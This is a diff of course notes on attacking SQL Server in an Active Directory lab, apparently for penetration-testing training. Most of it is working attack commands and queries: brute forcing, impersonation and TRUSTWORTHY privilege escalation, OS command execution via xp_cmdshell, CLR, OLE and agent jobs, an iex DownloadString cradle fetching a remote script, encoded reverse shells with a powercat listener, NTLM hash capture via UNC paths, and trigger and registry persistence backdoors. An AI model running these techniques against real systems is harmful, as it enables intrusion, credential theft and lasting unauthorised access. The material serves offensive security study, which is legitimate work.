@@ -1,4 +1,4 @@
-Video 1 - Introduction:
+########################  Video 1 - Introduction ####################################
 
 Course Content:
 - Introduction to SQL server:	
@@ -13,8 +13,8 @@ Course Content:
 - Identifying Juicy Information
 - Defenses and Detection!
 
-##############################
-Video 2 - SQL Server:
+############################## Video 2 - SQL Server ##################################
+
 - Integrates with domain by providing Windows authentication
 - used by many enterprise applications
 - most enterprise networks have sizable number of SQL server instances
@@ -36,8 +36,8 @@ Principals:
 Look up SQL Server - Roles and Privileges!
 https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles
 
-###############################
-Video 3 - PowerShell:
+############################### Video 3 - PowerShell #######################################
+
 - Provides access to almost everything in a Windows platform and Active Directory Environment which could be useful for an attacker.
 - Provides the capability of running powerful scripts completely from memory making it ideal for foothold shells/boxes.
 - Easy to Learn and really Powerful!
@@ -127,11 +127,14 @@ powershell -enc
 PS C:\Users\victim.LETHALLAB\Downloads> .\Get-SQLInstance.ps1
 .\Get-SQLInstance.ps1 : File C:\Users\victim.LETHALLAB\Downloads\Get-SQLInstance.ps1 cannot be loaded because running
 scripts is disabled on this system.
+
 PS C:\Users\victim.LETHALLAB> Get-ExecutionPolicy
 Restricted
+
 PS C:\Users\victim.LETHALLAB> powershell.exe -ExecutionPolicy bypass
 Windows PowerShell
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
 PS C:\Users\victim.LETHALLAB> cd .\Downloads\
 PS C:\Users\victim.LETHALLAB\Downloads> ls
     Directory: C:\Users\victim.LETHALLAB\Downloads
@@ -177,7 +180,7 @@ PS C:\Users\victim.LETHALLAB\Downloads>
 
 Whenever there is a command execution opportunity, PowerShell scripts can be executed using the following methods:
 -> Download execute cradle:
-iex(New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+iex(New-Object Net.WebClient).DownloadString('https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1')
 
 -> Encodedcommand
 
@@ -195,8 +198,8 @@ A PowerShell toolkit for attacking SQL servers:
 https://github.com/NetSPI/PowerUpSQL
 "The PowerUpSQL module includes functions that support SQL Server discovery, auditing for common weak configurations, and privilege escalation on scale."
 
-#################################
-Video 4 - Discovering SQL Server within the Domain:
+#############################  Video 4 - Discovering SQL Server within the Domain #################################
+
 
 Discovery, Enumeration and Scanning
 - TCP/UDP port scan - can be done by any user connected to the network to discover SQL Servers listening on a network port
@@ -258,16 +261,6 @@ get-childitem SQLServer:\SQL\<machinename>
 Example:
 (there's something wrong with the command from the video)
 
-PS SQLSERVER:\> get-childitem SQLserver:\\SQL\win2016srv
-WARNING: Could not obtain SQL Server Service information. An attempt to connect to WMI on 'get-childitem' failed with
-the following error: The RPC server is unavailable. (Exception from HRESULT: 0x800706BA)
-get-childitem : Cannot call method. The provider does not support the use of filters.
-At line:1 char:1
-+ get-childitem SQLserver:\\SQL\win2016srv
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : NotImplemented: (:) [Get-ChildItem], PSNotSupportedException
-    + FullyQualifiedErrorId : NotSupported,Microsoft.PowerShell.Commands.GetChildItemCommand
-
 PS SQLSERVER:\> get-childitem SQLserver:\\SQL\
 MachineName
 -----------
@@ -291,7 +284,7 @@ Running  MSSQL$SQLEXPRESS   SQL Server (SQLEXPRESS)
 
 
 Or Using Registry Keys:
-$sqlinstances = Get-ItemProperty -Path 'hklm:\Software\Microsoft\Microsoft SQL Server'
+$sqlinstances = Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Microsoft SQL Server'
 foreach ($SqlInstance in $SqlInstances) {
 foreach ($s in $SQLInstance.InstalledInstances){
 [PSCustomObject]@{
@@ -310,7 +303,7 @@ Domain Enumeration:
 "servicePrincipalName=MSSQL *" 
 
 - and list all SQL servers: 
-Get-SQLInstanceDomain
+Get-SQLInstanceDomain -Verbose
 
 Example:
 PS C:\Users\victim.LETHALLAB\Downloads\PowerSploit-master\PowerSploit-master\Recon> Get-SQLInstanceDomain
@@ -343,20 +336,22 @@ Description      :
 Hands-On #1:
 Discover instance of SQL Server in the target domain using various enumeration methods!
 
-###############################
-Video 5: Brute Force Attacks:
+###########################################################  Video 5: Brute Force Attacks ###############################
 
 - brute force attacks are very noisy but very fruitful as well specially when it comes to databases
 - How many organizations monitor brute force attacks against SQL servers on a non-productive system?
 - we can brute force for database logins and domain users (which are actually mapped to database logins).
 - we need to make sure we don't throttle the account or lock it out! This will stand out and be very noisy!
 
-Brute-Force Attacks - Database User:
-- Invoke-BruteForce from Nishang:
-$comps | Invoke-BruteForce -UserList c:\dict\users.txt -PasswordList c:\dict\passwords.txt -Service SQL -Verbose
+(Get-SQLInstanceDomain).ComputerName
+$comps = (Get-SQLInstanceDomain).ComputerName
 
 - Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Username sa -Password Password -verbose
+
+Brute-Force Attacks - Database User:
+- Invoke-BruteForce from Nishang:
+$comps | Invoke-BruteForce -UserList c:\dict\users.txt -PasswordList c:\dict\passwords.txt -Service SQL -Verbose
 
 Example:
 . .\Tools\Invoke-BruteForce.ps1
@@ -376,10 +371,10 @@ https://blog.netspi.com/blindly-discover-sql-server-instances-powerupsql/
 
 Get-Command *info*
 
+#Get SQL server information. It will also tell us if we have sysadmin permissions anywhere.
 Get-SQLInstanceDomain | Get-SQLServerInfo
 
-
-We can enumerate database users on the databases with Public role and can then brut-force them:
+We can enumerate database users on the databases with Public role and can then brute-force them:
 SELECT SUSER_NAME(1)
 SELECT SUSER_NAME(2)
 SELECT SUSER_NAME(3)
@@ -388,10 +383,12 @@ SELECT SUSER_NAME(3)
 SELECT SUSER_NAME(200)
 
 
-- This can be automated using PowerUPSql:
+- This can be automated using PowerUPSql to discover users, which we can later bruteforce on. 
 Get-SQLFuzzServerLogin -Instance ops-mssql -Verbose
 
 - Once we have database users, a brute-force attack can be initiated:
+- Since 2005 the 'sa' user is disabled by default
+#Invoke-BruteForce -ComputerName ops-mssql -UserList c:\dict\users.txt -PasswordList c:\dict\passwords.txt -StopOnSuccess -Verbose
 Invoke-BruteForce -ComputerName ops-sqlsrvone -UserList c:\dict\users.txt -PasswordList c:\dict\passwords.txt -Service SQL -Verbose
 
 Reference: https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
@@ -406,8 +403,7 @@ Service: SQL
 Hands-On Number 2:
 Run brute force attacks against SQL Server instances discovered in earlier exercises.
 
-##############################
-Video 6 - Post Exploitation - Data Enumeration:
+############################## Video 6 - Post Exploitation - Data Enumeration ######################################
 
 After getting access to an SQL server, interesting information can be gathered:
 
@@ -417,15 +413,22 @@ Current User - SELECT SUSER_SNAME(), SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 (if we get a 1 it means we are sysadmin with the current user)
 
-Current Role - SELECT user
+Current Role - 
+SELECT user
 
-Current Database - SELECT db_name()
+Current Database - 
+SELECT db_name()
 
-List all databases - SELECT name FROM master..sysdatabases
+List all databases - 
+SELECT name FROM master..sysdatabases
 
 (if below is run with sysadmin privs - more logins are shown)
 All logins on server:
+SELECT * FROM sys.server_principals
+
+#this command Excludes the SERVER-ROLES. 
 SELECT * FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE'
+
 
 All database users from a database: 
 SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'
@@ -433,7 +436,7 @@ SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'
 We can use software called HeidiSQL_9.4_Portable to create a session and start querying!
 
 (if below is run with sysadmin privs - more logins are shown)
-List all sysadmin:
+List all sysadmin accounts that are disabled:
 SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin', name) = 1
 
 List all database roles:
@@ -451,11 +454,12 @@ Reference:
 https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql
 
 ######
-Effective Permissions:
+Effective Permissions when we run this as a normal user:
+Experiment running this with the 'sa' user, and you will notice different results, since the sa user has more permissions. 
 For the server:
 SELECT * FROM fn_my_permissions (NULL, 'SERVER');
 
-For the database:
+Check permissions we have For the database:
 fn_my_permissions(NULL, 'DATABASE');
 
 Active user token:
@@ -464,12 +468,13 @@ SELECT * FROM sys.user_token
 Active login token:
 SELECT * FROM sys.login_token
 
-################################
-Video 7 - Privilege Escalation Impersonation:
+################################ Video 7 - Privilege Escalation Impersonation - public to sysadmin  ############################################
+
 
 User Impersonation (EXECUTE AS)
 - when EXECUTE AS is used, the execution context is switched to the specified login or user name.
 - impersonation allows impersonation of other users and logins to be able to access resources which means it can be used to use privileges and objects available to other users.
+- by abusing misconfigured settings, we can privilege escalate our permissions in a MSSQL database. 
 
 Reference:
 https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql
@@ -479,9 +484,9 @@ SQL Servers can be abused in multiple ways to escalate privileges:
 - public to sysadmin (misconfigured roles and databases, poorly written stored procedures, excessive permissions)
 - sysadmin to OS Service Account (command execution, UNC path)
 - OS Service Account to OS Admin
-- OS admin to sysadmin
+- and then -> OS admin to sysadmin
 
-Find SQL Server logins which can be impersonated in the current database:
+Find SQL Server logins which can be impersonated in the current database and run the command below:
 SELECT distinct b.name
 FROM sys.server_permissions a
 INNER JOIN sys.server_principals b
@@ -493,11 +498,14 @@ https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-imperso
 
 Find Logins which can be impersonated:
 Invoke-SQLAuditPrivImpersonateLogin -Username sqluser -Password Sql@123 -Instance ops-mssql -Verbose
+(we discover 2 accounts, one that can impersonate the dbadmin account and one where the dbadmin account can impersonate the sa SYSADMIN account)
 
+- the command above has also an option to -Exploit with the user account found the next level. The command is not built to chain exploit and become SYSADMIN, so a step-by-step approach
+is needed to become Sysadmin:
 Invoke-SQLAuditPrivImpersonateLogin -Username sqluser -Password Sql@123 -Instance ops-mssql -Verbose - Exploit
 
-###########
-Exploiting impersonation:
+########### The Manual approach #######
+#Exploiting impersonation:
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 EXECUTE AS LOGIN = 'dbadmin'
@@ -508,21 +516,32 @@ SELECT ORIGINAL_LOGIN()
 Exploiting impersonation (note the difficulty in automating the abuse of chained/nested impersonation):
 Invoke-SQLAuditPrivImpersonateLogin -Instance ops-sqlsrvone.lethallab.local -Exploit -Verbose
 
-Exploiting chained/nested impersonation:
+Privilege Escalation - public to sysadmin!!!!!
+Manually Exploiting chained/nested impersonation:
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
-EXECUTE AS LOGIN = 'dbadmin'
+EXECUTE AS LOGIN = 'dbadmin' #this is the user we want to impersonate
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 SELECT ORIGINAL_LOGIN()
 EXECUTE AS LOGIN = 'sa'
 SELECT IS_SRVROLEMEMBER('sysadmin')
 
+#this becomes
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+EXECUTE AS LOGIN = 'dbadmin' #this is the user we want to impersonate
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sa')
+SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT ORIGINAL_LOGIN()
+
+
+
 Hands-On number 3:
 Escalate privileges on mssql server by abusing impersonation of database users!
 
-#####################################
-Video 8 - Privilege Escalation Trustworthy Property:
+##################################### Video 8 - Privilege Escalation Trustworthy Property - public to sysadmin #########################
 
 TrustWorthy Database:
 - a database property (is_trustworthy_on) used to indicate whether an SQL instance trusts a database and its contents. The property is turned off by default as a security measure. Only a sysadmin can be set a database to be trustworthy.
@@ -535,7 +554,15 @@ https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-d
 http://sqlity.net/en/1653/the-trustworhy-database-property-explained-part-1/
 
 TrustWorthy Database:
-- look for db_owner role (can be done with public role)
+- look for db_owner role (can be done/ran with public role)
+
+SELECT name as database_name
+, SUSER_NAME(owner_sid) AS database_owner
+, is_trustworthy_on AS TrustWorthy
+from sys.databases
+
+
+############
 use <database>
 SELECT DP1.name AS DatabaseRoleName,
 	isnull (DP2.name, 'No members') AS DatabaseUserName
@@ -547,13 +574,17 @@ LEFT OUTER JOIN sys.database_principals AS DP2
 WHERE DP1.type = 'R'
 ORDER BY DP1.name;
 
+# find which user you are
+select system_user
+
+
 - Look for TRUSTWORTHY database using PowerUPSQL:
 Invoke-SQLAudit -Instance ops-sqlsrvone.lethallab.com -Verbose | Out-GridView
 
 Invoke-SQLAuditPrivTrustworthy -Instance ops-sqlsrvone -Verbose
 
 
-- Execute AS to elevate privileges:
+- EXECUTE AS to elevate privileges:
 use trust_db
 Execute AS User = 'dbo'
 SELECT system_user
@@ -563,17 +594,18 @@ SELECT IS_SRVROLEMEMBER('sysadmin')
 REVERT
 SELECT system_user
 
+#YOU CAN TURN THE TRUSTWORTHY OFF, so the SA user cannot be impersonated!!!!
 ALTER DATABASE trust_db SET TRUSTWORHY OFF
 
 - if TRUSTWORHY property is turned off we will be unable to execute as it will not have enough permissions
+Results in error: 
 "Cannot alter the server role sysadmin, because it does not exist or you do not have enough permissions".
 
 Hands-on number 3:
-- escalate privileges on sqlsrvone server by abusing TRUSTWORHY database
+- escalate privileges on sqlsrvone server by abusing TRUSTWORHY database 
 - escalate sqlserver on mssql to sysadmin by abusing user (not login) impersonation and trustworthy database.
 
-###########################
-Video 9 - Command EXECUTION:
+########################### Video 9 - OS Command EXECUTION - xp_cmdShell #####################
 
 Part I:
 Now we have sysadmin privileges on an SQL Server, it is possible to execute OS level commands on the server.
@@ -626,9 +658,10 @@ Invoke-SQLOSCmd -username sa -password Password1 -Instance win2016srv.lethallab.
 - the DLL can have any file extension and can also be loaded from UNC path or WebDav.
 
 Adding an Extended Stored Procedure:
-sp_addextenddproc - can be used to register the stored procedure. Note that the function name in the DLL and the command must be exactly the same (case-sensitive)
+sp_addextenddproc - can be used to register the stored procedure. Note that the function name in the DLL and the command must be exactly the same (case-sensitive!!!)
 
 sp_addextenddproc 'xp_calc', 'c:\mydll\xp_calc.dll'
+
 
 - Execute the stored procedure:
 EXEC xp_calc
@@ -643,6 +676,7 @@ https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-cu
 Adding an Extended Stored Procedure
 - all this can be automated:
 Create-SQLFileXpDll -OutFile c:\fileserver\xp_calc.dll -Command "calc.exe" -ExportName xp_calc
+(this is the path on the attackers local machine - c:\fileserver\xp_calc.dll, not on the destination/target SQL server) 
 
 Get-SqlQuery -UserName sa -Password Password1 -Instance win2016srv -Query "sp_addextenddproc 'xp_calc', '\\192.168.2.2\fileserver\xp_calc.dll'"
 
@@ -650,6 +684,8 @@ Get-SqlQuery -UserName sa -Password Password1 -Instance win2016srv -Query "EXEC 
 
 - Listing existing Extended stored procedures:
 Get-SQLStoredProcedureXP -Instance win2016srv -verbose
+
+#### OS Command Execution - CLR Assemblies #####
 
 CLR Assemblies:
 - CLR(Common Language Runtime) is a run-time environment provided by the .NET Framework. SQL Server supports CLR integration which allows writing stored procedures and other things by importing a DLL.
@@ -728,11 +764,11 @@ We will notice that the command has created the Assembly code, and Procedure!
 Use below for executing command using CLR assembly:
 Invoke-PowerShellTCPOneLine.ps1
 
-We need to encode our reverse shell:
+We need to encode our PowerShell reverse shell:
 Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine.ps1 -OutCommand
 
 And we setup out listener:
-.\powercat.ps1
+. .\powercat.ps1
 Powercat -lvp 443 -t 1000
 
 In the SQL query type the command and copy the encrypted reverse shell:
@@ -744,8 +780,11 @@ Below command can be used to list all the stored procedures added using CLR:
 Get-SQLStoredProcedureCLR -Instance win2016srv -verbose
 
 
-Part II:
-OS Command Execution - OLE Automation Procedure
+############ Part II:
+
+
+OS Command Execution - OLE Automation Procedures
+
 - System stored procedures which allow use of COM objects using SQL queries
 - Turned off by default. Sysadmin privileges are required to enable it!
 - Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution.
@@ -764,7 +803,7 @@ GO
 RECONFIGURE;
 GO
 
-- Execute Command:
+- Execute Command and start calc.exe:
 DECLARE @output INT
 DECLARE @ProgramToRun VARCHAR(255)
 SET @ProgramToRun = 'Run("calc.exe")'
@@ -824,8 +863,8 @@ And we setup out listener:
 Powercat -lvp 443 -t 1000
 
 
-####
-Agent Jobs
+#### OS Command Execution - Agent Jobs ###################
+
 - SQL Server Agent is a Windows service that executes scheduled tasks or jobs
 - a job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure.
 - needs sysadmin role to create a job
@@ -920,11 +959,11 @@ Achieve command execution on win2016srv using agent jobs.
 
 You may like to note the difference between privileges of agent jobs and other command exec.
 
-############################
-Video 10 - OS Command Execution - External Scripts:
+############################  Video 10 - OS Command Execution - External Scripts ###############
+
 - External Scripts - R and Python. R introduced in SQL Server 2016 and Python in SQL Server 2017 for big data analytics and machine learning.
 - Runtime environments must be installed as prerequisite. Not on by default. Needs SQL Server service restart!
-- needs sysadmin privileges to be enabled and executed
+- Needs sysadmin privileges to be enabled and executed
 - Run with privileges of a dynamically created Windows user account (member of the SQLUserGroup).
 
 Reference:
@@ -938,6 +977,8 @@ GO
 EXEC sp_execute_external_script
 @language = N'R',
 @script = N'OutputDataSet <- data.frame(system("cmd.exe /c dir", intern=T))'
+or:
+@script = N'OutputDataSet <- data.frame(system("cmd.exe /c whoami", intern=T))'
 WITH RESULT SETS (([cmd_out] text));
 GO
 
@@ -977,14 +1018,15 @@ Invoke-SQLOSCmdR -Username sa -Password Password1 -Instance win2016srv -Command 
 Invoke-SQLOSCmdPython -Username sa -Password Password1 -Instance win2016srv -Command "powershell -e <base64encodedscript>" -Verbose
 
 
-###########
-Mapping Trust:
+########### Mapping Trust  ###############
+
 
 Once we move to the OS layer by executing OS commands, it is possible to move laterally to spread our access. SQL Servers provide various possibilities for lateral movement:
 - Shared service account - Domain User or Domain admin (OS layer). We have already touched above while discussing brute-force attacks.
 - Database links - Move laterally in the database layer.
 
-Mapping Trust - Domain User
+####### Mapping Trust - Domain User !!!!!!!!!!!!!!
+
 As discusses earlier, SQL Server allows Domain user logins which, essentially, makes it a part of the domain trust!
 Once access to a domain user is established, we can enumerate what privileges it has on SQL servers in the domain.
 I have often observed domain users to have public (and sometimes sysadmin) privileges on some SQL Servers in the domain.
@@ -998,16 +1040,18 @@ runas /noprofile /netonly /user:<domain\username> powershell.exe
 
 Note that if we have access to hashes or tickets of any user, it always pays to check if that user is sysadmin on any database in the domain.
 
+
+
 A user with public (everyone) role can be used to enumerate domain accounts and groups in the forest and other trusted forests by fuzzing the values to SUSER_NAME function.
 
 Get-SQLFuzzDomainAccount -Instance win2016srv.lethallab.local -StartdId 500 -EndId 2000 -Verbose
 
-- we can do the same for a forest if we need to:
+- we can do the same for a forest if we need to, and we can get hostnames and usernames from the FOREST domain lethal.com:
 Get-SQLFuzzDomainAccount -Instance win2016srv -StartdId 500 -EndId 2000 -Verbose -Domain lethal.com 
 
 
 Hands-on Number 6:
-- get a reverse shell on sqlsrvone with privileges of the service account
+- get a reverse shell on sqlsrvone with privileges of the service account or agent account.
 - check if that user has special privileges on any other machine or database in the domain.
 
 
@@ -1021,8 +1065,8 @@ Hands-on number 7:
 Reference:
 https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
 
-##########################
-Video 11 - Abusing Trusts - Database Links:
+##########################  Video 11 - Abusing Trusts - Database Links #########################
+
 - a database link allows an SQL Server to access external data sources like other SQL Servers and OLE DB data sources (Access, Excel, Oracle, etc.)
 - in case of database links between SQL Servers, that is, linked SQL servers it is possible to execute stored procedures
 - Database links work across SQL Server versions and even across forest trusts.
@@ -1069,10 +1113,11 @@ Decrypting Database Link Server Passwords:
 https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/
 
 Hands-on numbers 8:
-Get a reverse shell on dps-sqlsrvtwo by abusing database links!
+Get a reverse shell on dps-sqlsrvtwo by abusing database links!!!!!
 
-##########################
-Video 12 - Privilege Escalation - public to service account:
+
+
+########################## Video 12 - Privilege Escalation - public to service account ##################
 
 UNC Path Injection:
 - a very well known method to capture Net-NTLM (also known as NTLM v1/v2) hashes
@@ -1099,8 +1144,7 @@ OS Admin to sysadmin:
 There are well known ways of getting sysadmin privileges if we have local admin privileges at the operating system level.
 Extracting service account credentials from LSA Secrets and/or memory, Token Impersonation for the SQL Service service, single user mode, etc are very well known methods.
 
-########################
-Video 13 - Persistence:
+######################## Video 13 - Persistence #################
 
 During a pentest or Red Team operation, Persistence is a very important step!
 SQL Server provides persistence opportunities with Startup stored procedures, Triggers and Registry keys.
@@ -1143,7 +1187,7 @@ https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/
 Hands-on number 9:
 Backdoor an SQL Server to add sysadmin where SQL Server service is running as a domain user which is a local admin on one or more boxes.
 
-Persistence - Triggers:
+####### Persistence - Triggers:
 A trigger is a special kind of stored procedure that automatically executes when an event occurs in the SQL Server.
 There are three types of triggers:
 - Data Definition Language (DDL) - Executes on Create, Alter and Drop statements and some system stored procedures
@@ -1155,7 +1199,7 @@ Reference:
 https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql
 
 DDL Triggers:
-Can be used if no custome database exists on the SQL Server.
+Can be used if no customer database exists on the SQL Server.
 Create a trigger (assuming xp_cmdshell is already enabled):
 
 CREATE Trigger [persistence_ddl_1]
@@ -1172,7 +1216,7 @@ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl
 https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups
 
 
-DML Triggers:
+####### DML Triggers:
 When using DML triggers and xp_cmdshell (or any other command execution), please keep in mind that when the trigger gets executed by a normal user, he/she must have privileges to do so.
 
 Create a trigger (assuming xp_cmdshell is already enabled):
@@ -1197,7 +1241,7 @@ Reference:
 https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/
 https:/docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers
 
-Logon Trigger:
+###### Persistence - Logon Trigger:
 Executes after the authentication phase of logging finishes, but before the session is established. This makes a logon trigger ideal for triggering with a logon failure of a low-privilege user.
 
 Create a trigger (assuming xp_cmdshell is already enabled):
@@ -1229,7 +1273,7 @@ Get-SQLTriggerDDl -Instance win2016srv -username sa -Password Password1 -Verbose
 Get-SQLTriggerDML -Instance win2016srv -username sa -Password Password1 -Verbose
 
 
-Persistence - Registry
+######### Persistence - Registry
 SQL Server provides stored procedures to interact with Windows registry:
 
 - xp_regwrite - Needs sysadmin
@@ -1281,8 +1325,7 @@ https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerups
 Hands-on number 10:
 Change the value of xp_regwrite allowed paths to allow a non-admin user write to the registry run key to persist on a system!
 
-########################
-Video 14 - Defenses:
+######################## Video 14 - Defenses ####################################
 
 Audit SQL Servers to check the flow of links, trusts, privileges and credentials.
 Ensure that Service Accounts for databases are not high privilege domain account.
